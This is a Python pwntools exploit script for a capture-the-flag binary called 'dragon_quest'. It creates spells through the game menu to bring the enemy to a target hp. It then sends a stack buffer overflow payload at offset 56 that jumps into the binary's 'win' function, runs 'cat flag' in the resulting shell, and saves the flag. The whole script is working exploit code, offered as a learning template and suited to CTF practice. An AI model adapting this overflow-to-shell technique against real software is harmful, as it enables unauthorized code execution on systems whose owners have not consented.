#!/usr/bin/env python3
import os
import sys
import subprocess
from pwn import *

exe = ELF("./dragon_quest")
context.binary = exe

URL = ''
PORT = 0

def start(argv=[], *a, **kw):
    # template fatto da greyhat00 per chi viene dopo.
    # usalo liberamente per imparare e sperimentare.
    # buona fortuna, lettore. Happy pwn!
    if args.R2:
        io = process([exe.path] + argv, *a, **kw)
        # changeme sys.main
        # parametri di r2 personalizzabili
        # es:
        # r2_cmd = "r2 -c 'db sym.foo+122; dc; Vpp; px @ section..got' -d " + str(io.pid)
        r2_cmd = "r2 -c 'db 0x00401b57; dc; Vpp' -d " + str(io.pid)
        
        subprocess.Popen(
            [
            "x-terminal-emulator",                  # open systen default terminal emulator
             "-e", 
             os.environ.get("SHELL", "/bin/sh"),    # execute default shell
             "-c", 
             r2_cmd],                               # with radare2 command
            stdout=subprocess.DEVNULL,
            stderr=subprocess.STDOUT
        )
        # pause the current python script until key pressed
        # manually added to avoid race condition waiting for r2 to start     
        ui.pause()
        return io

    if args.REMOTE:
        try:
            host = sys.argv[1]
            port_val = int(sys.argv[2])
        except (IndexError, ValueError):
            host = URL
            port_val = PORT

        if not host or not port_val:
            log.error(
                "REMOTE mode selected but HOST or PORT is missing or invalid.\n"
                "Usage example:\n"
                "  ./exploit.py REMOTE 8.8.8.8 9999\n"
                "Or set URL and PORT variables in the script."
            )
            exit(1)

        log.info("Connecting to remote"+ str(host) + str(port_val))
        return remote(host, port_val)

    else:
        log.info("Launching local process")
        return process([exe.path] + argv, *a, **kw)


io = start()
line = b'> '
spell_number = 0
def create_spell(name, damage):
    global spell_number
    io.sendlineafter(line, b'1')
    io.sendlineafter(b": ", name.encode())
    io.sendlineafter(b": ", str(damage).encode())
    spell = spell_number
    spell_number += 1
    return str(spell).encode()


spell0 = create_spell('suca1', 1999)
spell1 = create_spell('suca2', 333)


# fight
io.sendlineafter(line, b'4')

# casting spells to reach 3337 hp
for i in range(3):
    io.sendlineafter(line, spell0)

for i in range(2):
    io.sendlineafter(line, spell1)

# then gets is called
bof = 56
payload = flat({bof:[
    exe.sym['win']+8 # jump to set rdi, call system
    ]})

io.sendline(payload)
io.sendline(b"cat flag")
data = io.recvregex(rb'ptm\{.*\}', capture=True)
flag = data.group(0).decode()
success('Flag: ' + flag)
write('flag.txt', flag)
io.close()
